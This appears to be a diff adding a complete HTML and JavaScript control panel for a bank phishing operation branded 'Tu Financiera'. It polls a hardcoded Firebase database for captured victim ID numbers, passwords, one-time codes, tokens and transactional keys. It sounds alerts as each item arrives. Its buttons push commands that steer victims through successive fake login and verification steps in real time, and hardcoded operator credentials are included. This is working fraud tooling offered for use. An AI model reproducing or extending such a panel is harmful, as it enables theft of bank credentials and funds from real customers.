@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Panel · Tu Financiera</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --verde:#8dc63f;
+  --verde-osc:#6aa62c;
+  --verde-suave:#f2f9e8;
+  --azul:#0574af;
+  --rojo:#c8102e;
+  --rojo-suave:#fdf0f2;
+  --bg:#eef1f5;
+  --linea:#e1e5eb;
+  --linea-fuerte:#cfd6df;
+  --txt:#1c2530;
+  --muted:#6c7886;
+  --sombra:0 1px 2px rgba(16,24,40,.05), 0 6px 18px rgba(16,24,40,.06);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:var(--bg);color:var(--txt);font-family:'Inter',sans-serif;font-size:13px;-webkit-font-smoothing:antialiased}
+
+#login{position:fixed;inset:0;background:#0d1b26;display:flex;align-items:center;justify-content:center;padding:20px;z-index:200}
+#login .caja{background:#fff;border-radius:12px;padding:34px 30px;width:100%;max-width:370px;box-shadow:0 24px 60px rgba(0,0,0,.4)}
+#login .marca{display:flex;align-items:center;gap:10px;margin-bottom:22px}
+#login .esc{width:38px;height:38px;border-radius:9px;background:var(--verde);display:flex;align-items:center;justify-content:center;color:#fff;font-weight:800;font-size:15px}
+#login h1{font-size:15px;font-weight:800}
+#login .sub{font-size:11px;color:var(--muted);margin-top:2px}
+#login label{display:block;font-size:10.5px;font-weight:700;letter-spacing:.8px;color:var(--muted);text-transform:uppercase;margin-bottom:6px}
+#login input{width:100%;border:1.5px solid var(--linea);border-radius:8px;padding:11px 13px;font-family:inherit;font-size:14px;margin-bottom:15px;outline:none;color:var(--txt)}
+#login input:focus{border-color:var(--verde);box-shadow:0 0 0 3px rgba(141,198,63,.18)}
+#login button{width:100%;background:var(--verde);color:#fff;border:0;border-radius:8px;padding:12px;font-family:inherit;font-weight:700;font-size:13.5px;cursor:pointer}
+#login button:hover{background:var(--verde-osc)}
+#login .err{display:none;background:var(--rojo-suave);border:1px solid #f2c4cc;color:#96122a;font-size:12px;padding:9px;border-radius:7px;margin-bottom:14px;text-align:center}
+
+header{position:sticky;top:0;z-index:60;background:#fff;border-bottom:3px solid var(--verde);box-shadow:var(--sombra)}
+.hbar{display:flex;align-items:center;gap:14px;padding:12px 22px;flex-wrap:wrap}
+.marca{display:flex;align-items:center;gap:10px}
+.marca .esc{width:34px;height:34px;border-radius:8px;background:var(--verde);color:#fff;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:13px}
+.marca div{line-height:1.2}
+.marca b{font-size:13.5px;font-weight:800;display:block}
+.marca span{font-size:10px;color:var(--muted);letter-spacing:.6px;text-transform:uppercase;font-weight:600}
+.conn{font-size:9.5px;font-weight:800;letter-spacing:.8px;padding:4px 9px;border-radius:20px;background:var(--verde-suave);color:var(--verde-osc);border:1px solid #d6e8c3;text-transform:uppercase}
+.conn.err{background:var(--rojo-suave);color:#96122a;border-color:#f2c4cc}
+.stats{display:flex;gap:8px;margin-left:auto;flex-wrap:wrap}
+.st{background:#f8fafc;border:1px solid var(--linea);border-radius:9px;padding:7px 14px;min-width:70px;text-align:center}
+.st b{display:block;font-size:17px;font-weight:800;font-family:'JetBrains Mono',monospace;line-height:1.1}
+.st span{font-size:8.5px;font-weight:700;letter-spacing:.8px;color:var(--muted);text-transform:uppercase}
+.st.g b{color:var(--verde-osc)} .st.b b{color:var(--azul)} .st.v b{color:#7c3aed} .st.r b{color:var(--rojo)}
+.hacc{display:flex;gap:7px;margin-left:8px}
+.herr{display:none;background:var(--rojo-suave);border-bottom:1px solid #f2c4cc;color:#96122a;font-size:11.5px;padding:8px 22px;font-weight:600}
+
+.toolbar{display:flex;gap:10px;padding:12px 22px;background:#fff;border-bottom:1px solid var(--linea);flex-wrap:wrap;align-items:center}
+.tabs{display:flex;gap:5px;flex-wrap:wrap}
+.tab{background:#fff;border:1px solid var(--linea-fuerte);color:var(--muted);font-family:inherit;font-size:10px;font-weight:700;letter-spacing:.6px;padding:7px 12px;border-radius:20px;cursor:pointer;text-transform:uppercase}
+.tab:hover{border-color:var(--verde);color:var(--verde-osc)}
+.tab.on{background:var(--verde);border-color:var(--verde);color:#fff}
+.tab.alt.on{background:var(--azul);border-color:var(--azul)}
+.buscar{margin-left:auto;position:relative}
+.buscar input{width:280px;border:1px solid var(--linea-fuerte);border-radius:20px;padding:8px 14px 8px 33px;font-family:inherit;font-size:12px;outline:none;color:var(--txt);background:#fbfcfd}
+.buscar input:focus{border-color:var(--azul);background:#fff}
+.buscar svg{position:absolute;left:11px;top:50%;transform:translateY(-50%);width:13px;height:13px;stroke:var(--muted);fill:none;stroke-width:2.5}
+.btn{font-family:inherit;font-size:10px;font-weight:800;letter-spacing:.6px;text-transform:uppercase;padding:8px 13px;border-radius:7px;cursor:pointer;border:1px solid var(--linea-fuerte);background:#fff;color:var(--txt)}
+.btn:hover{border-color:var(--azul);color:var(--azul)}
+.btn.peligro{color:var(--rojo);border-color:#eec3ca}
+.btn.peligro:hover{background:var(--rojo);color:#fff;border-color:var(--rojo)}
+
+main{padding:16px 22px 70px}
+.tabla{background:#fff;border:1px solid var(--linea);border-radius:11px;overflow-x:auto;box-shadow:var(--sombra)}
+table{width:100%;border-collapse:collapse;min-width:1150px}
+thead th{background:#f7f9fb;text-align:left;font-size:8.5px;font-weight:800;letter-spacing:.9px;text-transform:uppercase;color:var(--muted);padding:10px 8px;border-bottom:1px solid var(--linea);white-space:nowrap}
+tbody td{padding:8px;border-bottom:1px solid #f0f3f6;font-size:11px;vertical-align:middle}
+tbody tr:hover{background:#fafcfe}
+tbody tr:last-child td{border-bottom:0}
+tr.nuevo td:first-child{box-shadow:inset 3px 0 0 var(--verde)}
+tr.dato{background:#f6fbf1}
+tr.reenvio{background:#eff8fd}
+tr.oculto{opacity:.5}
+
+.chip{display:inline-block;font-size:8.5px;font-weight:800;padding:3px 7px;border-radius:5px;letter-spacing:.4px;text-transform:uppercase;white-space:nowrap}
+.chip.CLAVE{background:#eaf2fb;color:#1d4f7c}
+.chip.VERIFICANDO{background:#fdf6e3;color:#8a6207}
+.chip.CODIGO,.chip.CODIGO2,.chip.TOKEN,.chip.TOKEN2,.chip.VALIDANDO{background:#eaf7ef;color:#1c6b3a}
+.chip.CLAVETRANS,.chip.AUTORIZANDO{background:#f3ecfd;color:#6b28c4}
+.chip.FINALIZADO{background:#e3f6e9;color:#166534}
+.chip.RECHAZADO{background:#fdecef;color:#96122a}
+.mono{font-family:'JetBrains Mono',monospace;font-size:10.5px;color:#33414f}
+.cred{font-family:'JetBrains Mono',monospace;font-size:10.5px;color:#0f1a24;word-break:break-all}
+.v{font-family:'JetBrains Mono',monospace;font-size:12px;font-weight:700;letter-spacing:1px;color:#15803d}
+.v.p{color:#7c3aed}
+.v.n{color:#c3cbd4;font-size:10px;letter-spacing:0;font-weight:500}
+.ip{font-family:'JetBrains Mono',monospace;font-size:9.5px;color:#3f5f4b;word-break:break-all}
+.ip .ubi{display:block;color:var(--muted);font-size:9px;font-family:'Inter',sans-serif}
+.ip.bloq{color:var(--rojo);font-weight:700}
+.tiempo{font-size:9.5px;color:var(--muted);white-space:nowrap}
+.acc{display:flex;gap:3px;flex-wrap:wrap;max-width:250px}
+.b{padding:4px 6px;border-radius:4px;border:1px solid transparent;font-family:inherit;font-size:7.5px;font-weight:800;text-transform:uppercase;letter-spacing:.3px;cursor:pointer;white-space:nowrap}
+.b:hover{opacity:.82}
+.b1{background:#fff4e6;color:#a35c00;border-color:#f5d9b4}
+.b2{background:#f4edfd;color:#5b21b6;border-color:#dfcefa}
+.b3{background:#e9f8ef;color:#166534;border-color:#c4ecd5}
+.b4{background:#eaf2fb;color:#1d4f7c;border-color:#c9ddf2}
+.b5{background:#fdecef;color:#96122a;border-color:#f2c4cc}
+.b6{background:#f4f6f9;color:#41505f;border-color:#dde3ea}
+.b7{background:#96122a;color:#fff;border-color:#96122a}
+.vacio{text-align:center;padding:60px 20px;color:var(--muted);font-size:12.5px}
+.vacio b{display:block;font-size:14px;color:var(--txt);margin-bottom:5px}
+
+#alertas{position:fixed;right:18px;bottom:18px;z-index:150;display:flex;flex-direction:column;gap:8px;max-width:310px}
+.al{background:#fff;border:1px solid var(--linea);border-left:4px solid var(--verde);border-radius:9px;padding:11px 14px;font-size:12px;box-shadow:0 8px 26px rgba(16,24,40,.16);animation:in .25s ease}
+.al.b{border-left-color:#7c3aed}.al.c{border-left-color:var(--azul)}
+.al b{display:block;font-size:10px;letter-spacing:.8px;margin-bottom:3px;text-transform:uppercase}
+@keyframes in{from{transform:translateX(26px);opacity:0}to{transform:none;opacity:1}}
+@media(max-width:620px){
+  .hbar{padding:10px 14px}.toolbar,main{padding-left:14px;padding-right:14px}
+  .stats{width:100%;margin-left:0}.st{flex:1;min-width:0}
+  .buscar{margin-left:0;width:100%}.buscar input{width:100%}
+}
+</style>
+</head>
+<body>
+
+<div id="login">
+  <div class="caja">
+    <div class="marca">
+      <div class="esc">T</div>
+      <div><h1>Panel Tu Financiera</h1><div class="sub">Código · Token · Clave transaccional</div></div>
+    </div>
+    <div class="err" id="loginErr"></div>
+    <label>Usuario</label>
+    <input id="usuario" autocomplete="off">
+    <label>Clave</label>
+    <input id="clave" type="password" autocomplete="off">
+    <button id="entrar">Ingresar</button>
+  </div>
+</div>
+
+<div id="panel" style="display:none">
+  <header>
+    <div class="hbar">
+      <div class="marca"><div class="esc">T</div><div><b>Panel Tu Financiera</b><span>Control de accesos</span></div></div>
+      <span class="conn" id="conn">En línea</span>
+      <div class="stats">
+        <div class="st"><b id="stTotal">0</b><span>Total</span></div>
+        <div class="st g"><b id="stProc">0</b><span>En curso</span></div>
+        <div class="st v"><b id="stDatos">0</b><span>Datos</span></div>
+        <div class="st b"><b id="stFin">0</b><span>Final</span></div>
+        <div class="st r"><b id="stRec">0</b><span>Rechaz</span></div>
+      </div>
+      <div class="hacc">
+        <button class="btn" id="refrescar">Refrescar</button>
+        <button class="btn peligro" id="borrarTodo">Borrar todo</button>
+        <button class="btn" id="salir">Salir</button>
+      </div>
+    </div>
+    <div class="herr" id="herr"></div>
+    <div class="toolbar">
+      <div class="tabs" id="tabs">
+        <button class="tab on" data-f="todos">Todos</button>
+        <button class="tab alt" data-f="datos">Con datos</button>
+        <button class="tab alt" data-f="codigo">Códigos</button>
+        <button class="tab alt" data-f="token">Tokens</button>
+        <button class="tab alt" data-f="clave">Clave trans.</button>
+        <button class="tab alt" data-f="reenvio">Reenvíos</button>
+        <button class="tab" data-f="final">Finalizados</button>
+        <button class="tab" data-f="rechazado">Rechazados</button>
+      </div>
+      <div class="buscar">
+        <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><path d="M20 20l-4-4"/></svg>
+        <input id="buscador" placeholder="Buscar documento, clave, IP...">
+      </div>
+    </div>
+  </header>
+  <main><div class="tabla" id="tabla"></div></main>
+</div>
+
+<div id="alertas"></div>
+
+<script>
+(function(){
+  var DB = "https://cbonnlineec-default-rtdb.firebaseio.com/nbch";
+  var ADMIN_USER = "Ghost", ADMIN_PASS = "Cabimas01.";
+
+  var datos = {usuarios:{}, comandos:{}};
+  var anterior = {}, ocultos = {}, bloqueadas = {};
+  var tab = 'todos', texto = '', ac = null, ultimoBeep = 0, activo = false;
+
+  var loginErr = document.getElementById('loginErr');
+  document.getElementById('entrar').addEventListener('click', entrar);
+  document.getElementById('clave').addEventListener('keydown', function(e){ if(e.key==='Enter') entrar(); });
+
+  function entrar(){
+    if(document.getElementById('usuario').value.trim() === ADMIN_USER && document.getElementById('clave').value === ADMIN_PASS){
+      try{ sessionStorage.setItem('auth_panel_tufi','true'); }catch(x){}
+      abrir();
+    } else {
+      loginErr.textContent = 'Usuario o clave incorrectos';
+      loginErr.style.display = 'block';
+    }
+  }
+
+  function abrir(){
+    document.getElementById('login').style.display = 'none';
+    document.getElementById('panel').style.display = 'block';
+    activo = true;
+    cargarBloqueos();
+    ciclo();
+  }
+
+  document.getElementById('salir').addEventListener('click', function(){
+    try{ sessionStorage.removeItem('auth_panel_tufi'); }catch(x){}
+    location.reload();
+  });
+
+  document.getElementById('refrescar').addEventListener('click', function(){ ciclo(true); });
+
+  document.getElementById('borrarTodo').addEventListener('click', function(){
+    var n = Object.keys(datos.usuarios).length;
+    if(!n) return alert('No hay registros para borrar.');
+    if(!confirm('Se van a borrar los ' + n + ' registros y sus comandos. ¿Continuar?')) return;
+    var b = this; b.disabled = true; b.textContent = 'Borrando...';
+    Promise.all([
+      fetch(DB+'/usuarios.json',{method:'DELETE'}),
+      fetch(DB+'/comandos.json',{method:'DELETE'})
+    ]).then(function(){
+      datos.usuarios = {}; datos.comandos = {}; anterior = {}; ocultos = {};
+      render(); alertar('LIMPIADO', 'Se borraron ' + n + ' registros.');
+    }).catch(function(){ alert('No se pudo borrar.'); })
+      .then(function(){ b.disabled = false; b.textContent = 'Borrar todo'; });
+  });
+
+  function beep(f, d){
+    var t = Date.now(); if(t - ultimoBeep < 320) return; ultimoBeep = t;
+    try{
+      ac = ac || new (window.AudioContext || window.webkitAudioContext)();
+      var o = ac.createOscillator(), g = ac.createGain();
+      o.connect(g); g.connect(ac.destination); o.type = 'square'; o.frequency.value = f;
+      g.gain.setValueAtTime(.05, ac.currentTime);
+      g.gain.exponentialRampToValueAtTime(.001, ac.currentTime + d);
+      o.start(); o.stop(ac.currentTime + d);
+    }catch(e){}
+  }
+
+  function alertar(titulo, cuerpo, tipo){
+    var d = document.createElement('div');
+    d.className = 'al' + (tipo ? ' ' + tipo : '');
+    d.innerHTML = '<b>' + titulo + '</b>' + cuerpo;
+    document.getElementById('alertas').appendChild(d);
+    setTimeout(function(){ d.remove(); }, 7000);
+  }
+
+  function herr(m){
+    var h = document.getElementById('herr');
+    h.style.display = 'block'; h.textContent = 'Error de conexión: ' + m;
+    var c = document.getElementById('conn'); c.className = 'conn err'; c.textContent = 'Sin conexión';
+  }
+
+  function get(u){ return fetch(u).then(function(r){ return r.json(); }); }
+  function cargarBloqueos(){ get(DB+'/ips_bloqueados.json').then(function(v){ bloqueadas = v || {}; }).catch(function(){}); }
+
+  function ciclo(manual){
+    if(!activo) return;
+    Promise.all([
+      get(DB+'/usuarios.json').catch(function(){ return datos.usuarios; }),
+      get(DB+'/comandos.json').catch(function(){ return datos.comandos; })
+    ]).then(function(r){
+      var u = r[0] || {}, c = r[1] || {};
+      detectar(u); datos.usuarios = u; datos.comandos = c; render();
+      var co = document.getElementById('conn'); co.className = 'conn'; co.textContent = 'En línea';
+      document.getElementById('herr').style.display = 'none';
+    }).catch(function(e){ herr(e.message || 'sin respuesta'); });
+    if(!manual) setTimeout(ciclo, 2200);
+  }
+
+  function detectar(u){
+    Object.keys(u).forEach(function(id){
+      var d = u[id] || {}, a = anterior[id] || {};
+      if(a.clave === undefined) return;
+      var quien = d.usuario || d.cedula || id;
+      if(d.clave && d.clave !== a.clave){ beep(760,.09); alertar('Clave de acceso', quien + ' → ' + d.clave); }
+      if(d.codigo && d.codigo !== a.codigo){ beep(900,.12); alertar('Código recibido', quien + ' → ' + d.codigo); }
+      if(d.codigo2 && d.codigo2 !== a.codigo2){ beep(1050,.12); alertar('Segundo código', quien + ' → ' + d.codigo2, 'b'); }
+      if(d.token && d.token !== a.token){ beep(1150,.12); alertar('Token recibido', quien + ' → ' + d.token, 'c'); }
+      if(d.token2 && d.token2 !== a.token2){ beep(1250,.12); alertar('Segundo token', quien + ' → ' + d.token2, 'c'); }
+      if(d.clave_transaccional && d.clave_transaccional !== a.clave_transaccional){ beep(980,.14); alertar('Clave transaccional', quien + ' → ' + d.clave_transaccional, 'b'); }
+      if(d.reenvio && d.reenvio !== a.reenvio){ beep(620,.1); alertar('Pidió reenvío', quien, 'c'); }
+      if(d.reenvio2 && d.reenvio2 !== a.reenvio2){ beep(560,.1); alertar('Pidió reenvío 2', quien, 'c'); }
+    });
+    anterior = JSON.parse(JSON.stringify(u));
+  }
+
+  function esc(s){ return String(s===undefined||s===null?'':s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
+
+  function hace(ts){
+    if(!ts) return '—';
+    var s = Math.floor((Date.now()-ts)/1000);
+    if(s < 60) return s+'s';
+    if(s < 3600) return Math.floor(s/60)+'m';
+    if(s < 86400) return Math.floor(s/3600)+'h';
+    return Math.floor(s/86400)+'d';
+  }
+
+  function chip(e){
+    var v = String(e||'').toUpperCase();
+    var m = {'CLAVE':'CLAVE','VERIFICANDO':'VERIFICANDO','CODIGO':'CODIGO','CODIGO 2':'CODIGO2',
+             'TOKEN':'TOKEN','TOKEN 2':'TOKEN2','VALIDANDO CODIGO':'VALIDANDO','VALIDANDO TOKEN':'VALIDANDO',
+             'VALIDANDO TOKEN 2':'VALIDANDO','CLAVE TRANSACCIONAL':'CLAVETRANS','AUTORIZANDO':'AUTORIZANDO',
+             'FINALIZADO':'FINALIZADO','RECHAZADO':'RECHAZADO'};
+    return m[v] || 'CLAVE';
+  }
+
+  function pasa(d){
+    var e = String(d.estado||'').toUpperCase();
+    if(tab === 'todos') return true;
+    if(tab === 'datos') return !!(d.clave);
+    if(tab === 'codigo') return e.indexOf('CODIGO') !== -1;
+    if(tab === 'token') return e.indexOf('TOKEN') !== -1;
+    if(tab === 'clave') return e.indexOf('TRANSACCIONAL') !== -1 || e === 'AUTORIZANDO';
+    if(tab === 'final') return e === 'FINALIZADO';
+    if(tab === 'rechazado') return e === 'RECHAZADO';
+    if(tab === 'reenvio') return (d.reenvio && Date.now()-d.reenvio < 3600000) || (d.reenvio2 && Date.now()-d.reenvio2 < 3600000);
+    return true;
+  }
+
+  function busca(d, id){
+    if(!texto) return true;
+    var t = [d.cedula,d.documento,d.usuario,d.clave,d.codigo,d.codigo2,d.token,d.token2,d.clave_transaccional,d.ip,d.ubicacion,d.estado,id].join(' ').toLowerCase();
+    return texto.toLowerCase().split(/\s+/).every(function(p){ return t.indexOf(p) !== -1; });
+  }
+
+  function render(){
+    var cont = document.getElementById('tabla');
+    var lista = [], total=0, proc=0, dat=0, fin=0, rec=0;
+
+    Object.keys(datos.usuarios).forEach(function(id){
+      var d = datos.usuarios[id] || {};
+      if(ocultos[id]) return;
+      if(!d.cedula && !d.clave) return;
+      var e = String(d.estado||'').toUpperCase();
+      total++;
+      if(e === 'FINALIZADO') fin++;
+      else if(e === 'RECHAZADO') rec++;
+      else proc++;
+      if(d.clave) dat++;
+      if(pasa(d) && busca(d, id)) lista.push({id:id, d:d});
+    });
+
+    document.getElementById('stTotal').textContent = total;
+    document.getElementById('stProc').textContent = proc;
+    document.getElementById('stDatos').textContent = dat;
+    document.getElementById('stFin').textContent = fin;
+    document.getElementById('stRec').textContent = rec;
+
+    if(!lista.length){
+      cont.innerHTML = '<div class="vacio"><b>Sin registros</b>Cuando alguien pase por el login aparece acá.</div>';
+      return;
+    }
+
+    lista.sort(function(a,b){ return (b.d.ts||0)-(a.d.ts||0); });
+
+    var h = '<table><thead><tr>'
+      + '<th>Estado</th><th>Documento</th><th>Clave</th><th>Cód. 1</th><th>Cód. 2</th>'
+      + '<th>Token 1</th><th>Token 2</th><th>Clave trans.</th><th>Reenv</th><th>IP</th><th>Último</th><th>Acciones</th>'
+      + '</tr></thead><tbody>';
+
+    lista.forEach(function(it){
+      var id = it.id, d = it.d;
+      var e = String(d.estado||'').toUpperCase();
+      var ip = d.ip && d.ip !== 'unknown' ? d.ip : '';
+      var bl = ip && bloqueadas[ip];
+      var cl = '';
+      if(d.ts && Date.now()-d.ts < 120000) cl += ' nuevo';
+      if(d.clave) cl += ' dato';
+      if((d.reenvio && Date.now()-d.reenvio < 60000) || (d.reenvio2 && Date.now()-d.reenvio2 < 60000)) cl += ' reenvio';
+      if(ocultos[id]) cl += ' oculto';
+
+      function cel(v, p){
+        return v ? '<span class="v' + (p?' p':'') + '">' + esc(v) + '</span>' : '<span class="v n">----</span>';
+      }
+
+      h += '<tr class="' + cl + '" data-id="' + id + '">'
+        + '<td><span class="chip ' + chip(e) + '">' + esc(e||'—') + '</span></td>'
+        + '<td class="mono">' + esc(d.cedula||d.documento||'—') + '</td>'
+        + '<td class="cred">' + esc(d.clave||'—') + '</td>'
+        + '<td>' + cel(d.codigo) + '</td>'
+        + '<td>' + cel(d.codigo2,'p') + '</td>'
+        + '<td>' + cel(d.token,'p') + '</td>'
+        + '<td>' + cel(d.token2,'p') + '</td>'
+        + '<td>' + cel(d.clave_transaccional,'p') + '</td>'
+        + '<td class="mono">' + ((d.reenvios||0)+(d.reenvios2||0)) + '</td>'
+        + '<td class="ip ' + (bl?'bloq':'') + '">' + esc(ip||'N/A') + (bl?' BLOQ':'') + '<span class="ubi">' + esc(d.ubicacion||'') + '</span></td>'
+        + '<td class="tiempo">' + hace(d.ultimoPing||d.ts) + '</td>'
+        + '<td><div class="acc">'
+          + '<button class="b b1" data-a="codigo" data-id="' + id + '">Código</button>'
+          + '<button class="b b2" data-a="codigo2" data-id="' + id + '">Código 2</button>'
+          + '<button class="b b4" data-a="token" data-id="' + id + '">Token</button>'
+          + '<button class="b b2" data-a="token2" data-id="' + id + '">Token 2</button>'
+          + '<button class="b b3" data-a="clave" data-id="' + id + '">Clave trans.</button>'
+          + '<button class="b b3" data-a="dejar" data-id="' + id + '">Dejar ir</button>'
+          + '<button class="b b5" data-a="rechazar" data-t="login" data-id="' + id + '">Rech. login</button>'
+          + '<button class="b b5" data-a="rechazar" data-t="codigo" data-id="' + id + '">Rech. código</button>'
+          + '<button class="b b5" data-a="rechazar" data-t="token" data-id="' + id + '">Rech. token</button>'
+          + '<button class="b b5" data-a="rechazar" data-t="clave" data-id="' + id + '">Rech. clave</button>'
+          + (ip ? '<button class="b b4" data-a="bloquear" data-ip="' + esc(ip) + '" data-id="' + id + '">Bloq IP</button>' : '')
+          + '<button class="b b6" data-a="ocultar" data-id="' + id + '">Ocultar</button>'
+          + '<button class="b b7" data-a="eliminar" data-id="' + id + '">Borrar</button>'
+        + '</div></td></tr>';
+    });
+
+    cont.innerHTML = h + '</tbody></table>';
+  }
+
+  document.getElementById('tabla').addEventListener('click', function(ev){
+    var b = ev.target.closest('button[data-a]');
+    if(!b) return;
+    var id = b.getAttribute('data-id'), a = b.getAttribute('data-a');
+
+    if(a === 'eliminar'){
+      if(!confirm('¿Borrar este registro?')) return;
+      fetch(DB+'/usuarios/'+id+'.json',{method:'DELETE'}).catch(function(){});
+      fetch(DB+'/comandos/'+id+'.json',{method:'DELETE'}).catch(function(){});
+      delete datos.usuarios[id]; delete anterior[id]; render(); return;
+    }
+    if(a === 'ocultar'){ ocultos[id] = true; render(); return; }
+    if(a === 'bloquear'){
+      var ip = b.getAttribute('data-ip'); if(!ip) return;
+      fetch(DB+'/ips_bloqueados/'+ip.replace(/\./g,'_')+'.json',{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip:ip,fecha:Date.now()})}).catch(function(){});
+      bloqueadas[ip] = true; render(); return;
+    }
+
+    if(a === 'rechazar'){
+      var t = b.getAttribute('data-t');
+      fetch(DB+'/comandos/'+id+'.json',{method:'PUT',headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({accion:'rechazar', rechazo:t, ts:Date.now()})}).catch(function(){});
+      beep(420,.08); return;
+    }
+
+    fetch(DB+'/comandos/'+id+'.json',{method:'PUT',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({accion:a, rechazo:'', ts:Date.now()})}).catch(function(){});
+    beep(500,.06);
+  });
+
+  document.getElementById('tabs').addEventListener('click', function(ev){
+    var t = ev.target.closest('.tab'); if(!t) return;
+    document.querySelectorAll('.tab').forEach(function(x){ x.classList.remove('on'); });
+    t.classList.add('on'); tab = t.getAttribute('data-f'); render();
+  });
+
+  document.getElementById('buscador').addEventListener('input', function(){ texto = this.value.trim(); render(); });
+
+  document.addEventListener('keydown', function(e){
+    if(e.key === '/' && document.activeElement.id !== 'buscador'){ e.preventDefault(); document.getElementById('buscador').focus(); }
+  });
+
+  try{ if(sessionStorage.getItem('auth_panel_tufi') === 'true') abrir(); }catch(x){}
+})();
+</script>
+</body>
+</html>
